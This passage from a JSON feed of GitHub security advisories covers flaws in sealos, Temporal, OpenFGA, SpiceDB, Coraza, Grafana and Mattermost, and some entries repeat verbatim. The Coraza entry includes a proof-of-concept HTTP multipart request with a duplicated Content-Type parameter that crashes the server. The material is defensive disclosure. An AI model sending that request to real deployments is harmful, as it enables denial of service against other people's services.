href=\"https://github.com/advisories/GHSA-74j8-w7f9-pp62\">https://github.com/advisories/GHSA-74j8-w7f9-pp62</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-74j8-w7f9-pp62",
            "title": "[github.com/labring/sealos] Improper configuration of RBAC permissions obtaining cluster control permissions",
            "date_modified": "2023-06-30T20:25:53.000Z",
            "date_published": "2023-06-30T20:25:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-74j8-w7f9-pp62"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Insecure defaults in open-source Temporal Server before version 1.20 on all platforms allows an attacker to craft a task token with access to a namespace other than the one specified in the request. Creation of this task token must be done outside of the normal Temporal server flow. It requires the namespace UUID and information from the workflow history for the target namespace. Under these conditions, it is possible to interfere with pending tasks in other namespaces, such as marking a task failed or completed.\nIf a task is targeted for completion by the attacker, the targeted namespace must also be using the same data converter configuration as the initial, valid, namespace for the task completion payload to be decoded by workers in the target namespace.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-3485\">https://nvd.nist.gov/vuln/detail/CVE-2023-3485</a></li>\n<li><a href=\"https://github.com/temporalio/temporal/releases/tag/v1.20.0\">https://github.com/temporalio/temporal/releases/tag/v1.20.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gm2g-2xr9-pxxj\">https://github.com/advisories/GHSA-gm2g-2xr9-pxxj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gm2g-2xr9-pxxj",
            "title": "[go.temporal.io/server] Temporal Server vulnerable to Incorrect Authorization and Insecure Default Initialization of Resource",
            "date_modified": "2023-06-30T20:25:38.000Z",
            "date_published": "2023-06-30T18:31:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gm2g-2xr9-pxxj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"overview\">Overview</h3>\n<p>OpenFGA versions v1.1.0 and prior are vulnerable to a DoS attack when certain Check and ListObjects calls are executed against authorization models that contain circular relationship definitions.</p>\n<h3 id=\"am-i-affected\">Am I Affected?</h3>\n<p>You are affected by this vulnerability if you are using OpenFGA v1.1.0 or earlier, and if you are executing certain <a href=\"https://openfga.dev/api/service#/Relationship%20Queries/Check\">Check</a> or <a href=\"https://openfga.dev/api/service#/Relationship%20Queries/ListObjects\">ListObjects</a> calls against a vulnerable authorization model. To see which of your models could be vulnerable to this attack, download OpenFGA v1.2.0 and run the following command: </p>\n<pre><code>./openfga validate-models --datastore-engine &lt;ENGINE&gt; --datastore-uri &lt;URI&gt; | jq .[] | select(.Error | contains(\"loop\"))\n</code></pre>\n<p>replacing the variables <code>&lt;ENGINE&gt;</code> and <code>&lt;URI&gt;</code> as needed.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>Upgrade to v1.1.1.</p>\n<h3 id=\"backward-compatibility\">Backward Compatibility</h3>\n<p>If you are not passing an invalid authorization model (as identified by running <code>./openfga validate-models</code>) as a parameter of your Check and ListObjects calls, this upgrade is backwards compatible. </p>\n<p>Otherwise, OpenFGA v1.1.1 will start returning HTTP 400 status codes on those calls.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openfga/openfga/security/advisories/GHSA-hr9r-8phq-5x8j\">https://github.com/openfga/openfga/security/advisories/GHSA-hr9r-8phq-5x8j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35933\">https://nvd.nist.gov/vuln/detail/CVE-2023-35933</a></li>\n<li><a href=\"https://github.com/openfga/openfga/commit/087ce392595f3c319ab3028b5089118ea4063452\">https://github.com/openfga/openfga/commit/087ce392595f3c319ab3028b5089118ea4063452</a></li>\n<li><a href=\"https://openfga.dev/api/service#/Relationship%20Queries/Check\">https://openfga.dev/api/service#/Relationship%20Queries/Check</a></li>\n<li><a href=\"https://openfga.dev/api/service#/Relationship%20Queries/ListObjects\">https://openfga.dev/api/service#/Relationship%20Queries/ListObjects</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hr9r-8phq-5x8j\">https://github.com/advisories/GHSA-hr9r-8phq-5x8j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hr9r-8phq-5x8j",
            "title": "[github.com/openfga/openfga] OpenFGA vulnerable to denial of service due to circular relationship",
            "date_modified": "2023-07-03T18:39:27.000Z",
            "date_published": "2023-06-28T22:49:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hr9r-8phq-5x8j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Any user making a negative authorization decision based on the results of a LookupResources request with 1.22.0 is affected.</p>\n<p>For example, using <code>LookupResources</code> to find a list of resources to allow access to be okay: some subjects that should have access to a resource may not. But if using <code>LookupResources</code> to find a list of banned resources instead, then some users that shouldn't have access may.</p>\n<p>Generally, <code>LookupResources</code> is not and should not be used to gate access in this way - that's what the <code>Check</code> API is for. Additionally, version 1.22.0 has included a warning about this bug since its initial release.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Avoid using <code>LookupResources</code> for negative authorization decisions if using <code>1.22.0</code>. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>The only affected release is <a href=\"https://github.com/authzed/spicedb/releases/tag/v1.22.0\">v1.22.0</a>, and it is patched in <a href=\"https://github.com/authzed/spicedb/releases/tag/v1.22.2\">v1.22.2</a> (there is no v1.22.1 release, though there is a git tag).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/authzed/spicedb/pull/1397\">https://github.com/authzed/spicedb/pull/1397</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/authzed/spicedb\">SpiceDB</a></li>\n<li>Ask a question in the <a href=\"https://authzed.com/discord\">SpiceDB Discord</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/authzed/spicedb/security/advisories/GHSA-m54h-5x5f-5m6r\">https://github.com/authzed/spicedb/security/advisories/GHSA-m54h-5x5f-5m6r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35930\">https://nvd.nist.gov/vuln/detail/CVE-2023-35930</a></li>\n<li><a href=\"https://github.com/authzed/spicedb/pull/1397\">https://github.com/authzed/spicedb/pull/1397</a></li>\n<li><a href=\"https://github.com/authzed/spicedb/releases/tag/v1.22.2\">https://github.com/authzed/spicedb/releases/tag/v1.22.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m54h-5x5f-5m6r\">https://github.com/advisories/GHSA-m54h-5x5f-5m6r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m54h-5x5f-5m6r",
            "title": "[github.com/authzed/spicedb] SpiceDB's LookupResources may return partial results",
            "date_modified": "2023-06-30T20:25:43.000Z",
            "date_published": "2023-06-28T22:48:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m54h-5x5f-5m6r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Due to the misuse of <code>log.Fatalf</code>, the application using coraza crashed after receiving crafted requests from attackers.</p>\n<h3 id=\"details\">Details</h3>\n<p><a href=\"https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29\">https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29</a>\nThe bodyprocessors of multipart uses <code>log.Fatalf</code> to handle errors from the <code>mime.ParseMediaType</code>, but <code>log.Fatalf</code> calls <code>os.Exit</code> directly after logging the error.\n<a href=\"https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291\">https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291</a>\nThis means that the application will immediately crash after receiving a malicious request that triggers an error in <code>mime.ParseMediaType</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The server can be demonstrated by <a href=\"https://github.com/corazawaf/coraza/tree/main/examples/http-server\">https://github.com/corazawaf/coraza/tree/main/examples/http-server</a></p>\n<p>After sending this request</p>\n<pre><code>POST / HTTP/1.1\nHost: 127.0.0.1:8090\nUser-Agent: curl/8.1.2\nAccept: */*\nContent-Length: 199\nContent-Type: multipart/form-data; boundary=------------------------5fa6351b877326a1; a=1; a=2\nConnection: close\n\n--------------------------5fa6351b877326a1\nContent-Disposition: form-data; name=\"file\"; filename=\"123\"\nContent-Type: application/octet-stream\n\n123\n\n--------------------------5fa6351b877326a1--\n</code></pre>\n<p>The server will crash immediately. The <code>a=1; a=2</code> in <code>Content-Type</code> makes <code>mime: duplicate parameter name</code> error.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>I believe the vulnerability was introduced by the following commit: <a href=\"https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec\">https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec</a>.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The error from <code>mime.ParseMediaType</code> should return directly.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h\">https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza-caddy/issues/48\">https://github.com/corazawaf/coraza-caddy/issues/48</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec\">https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/commit/e1b119b83e12c64f0957e00e8cad45a1b5f012f8\">https://github.com/corazawaf/coraza/commit/e1b119b83e12c64f0957e00e8cad45a1b5f012f8</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29\">https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/releases/tag/v3.0.1\">https://github.com/corazawaf/coraza/releases/tag/v3.0.1</a></li>\n<li><a href=\"https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291\">https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/commit/a5239ba3ce839e14d9b4f9486e1b4a403dcade8c\">https://github.com/corazawaf/coraza/commit/a5239ba3ce839e14d9b4f9486e1b4a403dcade8c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c2pj-v37r-2p6h\">https://github.com/advisories/GHSA-c2pj-v37r-2p6h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c2pj-v37r-2p6h",
            "title": "[github.com/corazawaf/coraza/v2] Coraza has potential denial of service vulnerability",
            "date_modified": "2023-07-05T19:51:37.000Z",
            "date_published": "2023-06-26T15:48:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c2pj-v37r-2p6h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Due to the misuse of <code>log.Fatalf</code>, the application using coraza crashed after receiving crafted requests from attackers.</p>\n<h3 id=\"details\">Details</h3>\n<p><a href=\"https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29\">https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29</a>\nThe bodyprocessors of multipart uses <code>log.Fatalf</code> to handle errors from the <code>mime.ParseMediaType</code>, but <code>log.Fatalf</code> calls <code>os.Exit</code> directly after logging the error.\n<a href=\"https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291\">https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291</a>\nThis means that the application will immediately crash after receiving a malicious request that triggers an error in <code>mime.ParseMediaType</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The server can be demonstrated by <a href=\"https://github.com/corazawaf/coraza/tree/main/examples/http-server\">https://github.com/corazawaf/coraza/tree/main/examples/http-server</a></p>\n<p>After sending this request</p>\n<pre><code>POST / HTTP/1.1\nHost: 127.0.0.1:8090\nUser-Agent: curl/8.1.2\nAccept: */*\nContent-Length: 199\nContent-Type: multipart/form-data; boundary=------------------------5fa6351b877326a1; a=1; a=2\nConnection: close\n\n--------------------------5fa6351b877326a1\nContent-Disposition: form-data; name=\"file\"; filename=\"123\"\nContent-Type: application/octet-stream\n\n123\n\n--------------------------5fa6351b877326a1--\n</code></pre>\n<p>The server will crash immediately. The <code>a=1; a=2</code> in <code>Content-Type</code> makes <code>mime: duplicate parameter name</code> error.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>I believe the vulnerability was introduced by the following commit: <a href=\"https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec\">https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec</a>.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The error from <code>mime.ParseMediaType</code> should return directly.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h\">https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza-caddy/issues/48\">https://github.com/corazawaf/coraza-caddy/issues/48</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec\">https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/commit/e1b119b83e12c64f0957e00e8cad45a1b5f012f8\">https://github.com/corazawaf/coraza/commit/e1b119b83e12c64f0957e00e8cad45a1b5f012f8</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29\">https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/releases/tag/v3.0.1\">https://github.com/corazawaf/coraza/releases/tag/v3.0.1</a></li>\n<li><a href=\"https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291\">https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291</a></li>\n<li><a href=\"https://github.com/corazawaf/coraza/commit/a5239ba3ce839e14d9b4f9486e1b4a403dcade8c\">https://github.com/corazawaf/coraza/commit/a5239ba3ce839e14d9b4f9486e1b4a403dcade8c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c2pj-v37r-2p6h\">https://github.com/advisories/GHSA-c2pj-v37r-2p6h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c2pj-v37r-2p6h",
            "title": "[github.com/corazawaf/coraza/v3] Coraza has potential denial of service vulnerability",
            "date_modified": "2023-07-05T19:51:37.000Z",
            "date_published": "2023-06-26T15:48:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c2pj-v37r-2p6h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Grafana is validating Azure AD accounts based on the email claim. </p>\n<p>On Azure AD, the profile email field is not unique and can be easily modified. </p>\n<p>This leads to account takeover and authentication bypass when Azure AD OAuth is configured with a multi-tenant app. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-3128\">https://nvd.nist.gov/vuln/detail/CVE-2023-3128</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-3128/\">https://grafana.com/security/security-advisories/cve-2023-3128/</a></li>\n<li><a href=\"https://github.com/grafana/grafana/blob/69fc4e6bc0be2a82085ab3885c2262a4d49e97d8/CHANGELOG.md\">https://github.com/grafana/grafana/blob/69fc4e6bc0be2a82085ab3885c2262a4d49e97d8/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mpv3-g8m3-3fjc\">https://github.com/advisories/GHSA-mpv3-g8m3-3fjc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mpv3-g8m3-3fjc",
            "title": "[github.com/grafana/grafana] Grafana vulnerable to Authentication Bypass by Spoofing",
            "date_modified": "2023-06-27T23:07:51.000Z",
            "date_published": "2023-06-22T21:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mpv3-g8m3-3fjc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Grafana is validating Azure AD accounts based on the email claim. </p>\n<p>On Azure AD, the profile email field is not unique and can be easily modified. </p>\n<p>This leads to account takeover and authentication bypass when Azure AD OAuth is configured with a multi-tenant app. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-3128\">https://nvd.nist.gov/vuln/detail/CVE-2023-3128</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-3128/\">https://grafana.com/security/security-advisories/cve-2023-3128/</a></li>\n<li><a href=\"https://github.com/grafana/grafana/blob/69fc4e6bc0be2a82085ab3885c2262a4d49e97d8/CHANGELOG.md\">https://github.com/grafana/grafana/blob/69fc4e6bc0be2a82085ab3885c2262a4d49e97d8/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mpv3-g8m3-3fjc\">https://github.com/advisories/GHSA-mpv3-g8m3-3fjc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mpv3-g8m3-3fjc",
            "title": "[github.com/grafana/grafana] Grafana vulnerable to Authentication Bypass by Spoofing",
            "date_modified": "2023-06-27T23:07:51.000Z",
            "date_published": "2023-06-22T21:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mpv3-g8m3-3fjc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Grafana is validating Azure AD accounts based on the email claim. </p>\n<p>On Azure AD, the profile email field is not unique and can be easily modified. </p>\n<p>This leads to account takeover and authentication bypass when Azure AD OAuth is configured with a multi-tenant app. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-3128\">https://nvd.nist.gov/vuln/detail/CVE-2023-3128</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-3128/\">https://grafana.com/security/security-advisories/cve-2023-3128/</a></li>\n<li><a href=\"https://github.com/grafana/grafana/blob/69fc4e6bc0be2a82085ab3885c2262a4d49e97d8/CHANGELOG.md\">https://github.com/grafana/grafana/blob/69fc4e6bc0be2a82085ab3885c2262a4d49e97d8/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mpv3-g8m3-3fjc\">https://github.com/advisories/GHSA-mpv3-g8m3-3fjc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mpv3-g8m3-3fjc",
            "title": "[github.com/grafana/grafana] Grafana vulnerable to Authentication Bypass by Spoofing",
            "date_modified": "2023-06-27T23:07:51.000Z",
            "date_published": "2023-06-22T21:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mpv3-g8m3-3fjc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Grafana is validating Azure AD accounts based on the email claim. </p>\n<p>On Azure AD, the profile email field is not unique and can be easily modified. </p>\n<p>This leads to account takeover and authentication bypass when Azure AD OAuth is configured with a multi-tenant app. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-3128\">https://nvd.nist.gov/vuln/detail/CVE-2023-3128</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-3128/\">https://grafana.com/security/security-advisories/cve-2023-3128/</a></li>\n<li><a href=\"https://github.com/grafana/grafana/blob/69fc4e6bc0be2a82085ab3885c2262a4d49e97d8/CHANGELOG.md\">https://github.com/grafana/grafana/blob/69fc4e6bc0be2a82085ab3885c2262a4d49e97d8/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mpv3-g8m3-3fjc\">https://github.com/advisories/GHSA-mpv3-g8m3-3fjc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mpv3-g8m3-3fjc",
            "title": "[github.com/grafana/grafana] Grafana vulnerable to Authentication Bypass by Spoofing",
            "date_modified": "2023-06-27T23:07:51.000Z",
            "date_published": "2023-06-22T21:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mpv3-g8m3-3fjc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost Apps Framework fails to verify that a secret provided in the incoming webhook request allowing an attacker to&nbsp;modify the contents of the post sent by the Apps.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-2783\">https://nvd.nist.gov/vuln/detail/CVE-2023-2783</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-455c-vqrf-mghr\">https://github.com/advisories/GHSA-455c-vqrf-mghr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-455c-vqrf-mghr",
            "title": "[github.com/mattermost/mattermost-server/v6] Mattermost Server Missing Authorization vulnerability",
            "date_modified": "2023-06-27T23:07:46.000Z",
            "date_published": "2023-06-16T09:30:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-455c-vqrf-mghr"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}